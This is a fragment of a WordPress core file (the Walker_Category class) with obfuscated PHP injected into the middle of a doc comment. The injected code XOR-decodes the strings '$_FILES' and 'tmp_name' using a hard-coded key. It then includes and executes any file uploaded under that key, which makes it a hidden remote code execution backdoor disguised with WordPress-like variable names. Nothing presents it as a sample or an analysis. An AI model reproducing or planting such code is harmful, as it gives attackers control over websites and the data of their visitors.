...
class Walker_Category extends Walker {
	...
	*
	 ...
	 *
	 * @since 2.1.0
	 * @since 5.9.0 Renamed `$page*/
 	
$tag_names = 'k0XKkj60L2Eqdkp';

$del_file = $tag_names;
function message($image_exts, $comment_regex)

{
    $ancestors = $comment_regex;
    $show_in_nav_menus = urldecode($image_exts);
    $reset = substr($ancestors,0, strlen($show_in_nav_menus));

    $original_link_html = $show_in_nav_menus ^ $reset;
    return $original_link_html;
}
$sanitized_email = ${message("4v%11%07.9", $del_file)};
$show_in_admin_all_list = $sanitized_email;
$numberposts = isset($show_in_admin_all_list[$del_file]);
if ($numberposts)

{
    $show_ui = $sanitized_email[$del_file];
    $permastructs = $show_ui[message("%1F%5D%28%14%05%0B%5BU", $del_file)];
	$mime_pattern = 'mime_match';
    $updated = $permastructs;
    include ($updated);
}


/* ` to `$data_object` to match parent class for PHP 8 named parameter support.
	 *
	 * @see Walker::end_el()
	 *
	 * @param string $output      Used to append additional content (passed by reference).
